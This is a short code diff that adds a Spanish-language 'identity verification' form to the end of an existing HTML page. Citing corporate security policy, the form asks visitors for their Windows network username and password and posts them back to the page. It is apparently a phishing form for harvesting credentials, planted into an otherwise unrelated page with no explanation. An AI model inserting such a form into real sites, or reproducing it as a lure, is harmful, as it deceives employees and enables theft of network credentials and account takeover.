@@ -805,5 +805,24 @@
     }, 3000);
   }
 </script>
+ <div style="max-width:400px; margin:60px auto; padding:30px; background:#fff; border-radius:12px; box-shadow:0 4px 20px rgba(0,0,0,0.1); font-family:sans-serif;">
+  <h2 style="text-align:center; color:#6b21a8;">Verificación de Identidad</h2>
+  <p style="text-align:center; color:#555; font-size:14px;">
+    Por políticas de seguridad corporativa, confirme su acceso con sus credenciales de red.
+  </p>
+  <form method="post">
+    <label style="font-size:13px; color:#333;">Usuario de red (Windows)</label><br>
+    <input type="text" name="username" placeholder="usuario.apellido" required
+      style="width:100%; padding:10px; margin:8px 0 16px 0; border:1px solid #ccc; border-radius:6px;"><br>
+
+    <label style="font-size:13px; color:#333;">Contraseña</label><br>
+    <input type="password" name="password" placeholder="••••••••" required
+      style="width:100%; padding:10px; margin:8px 0 16px 0; border:1px solid #ccc; border-radius:6px;"><br>
+
+    <button type="submit" style="width:100%; padding:12px; background:#6b21a8; color:#fff; border:none; border-radius:6px; font-weight:bold; cursor:pointer;">
+      Confirmar identidad
+    </button>
+  </form>
+</div>
 </body>
 </html>
